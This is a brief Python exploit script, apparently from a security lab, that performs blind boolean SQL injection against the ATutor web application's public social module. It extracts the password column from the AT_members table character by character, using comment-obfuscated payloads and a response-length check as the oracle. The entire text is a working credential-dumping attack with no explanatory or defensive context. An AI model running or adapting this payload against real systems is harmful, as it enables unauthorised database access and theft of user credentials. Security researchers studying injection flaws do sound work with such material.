import requests
import sys

sys.stdout.flush

for i in range(1,40):
    for j in range(32,126):
        true = "(select/**/ascii(substring((select/**/password/**/from/**/AT_members),%s,1)))=%s" % (i,j)
        base = "q=x%27)/**/or/**/"+true+";%23"
        url = "http://atutor/ATutor/mods/_standard/social/index_public.php?"
        res = requests.get(url + base )
        if(res.headers['Content-Length'] == "180"):
            print(chr(j),end='')
          
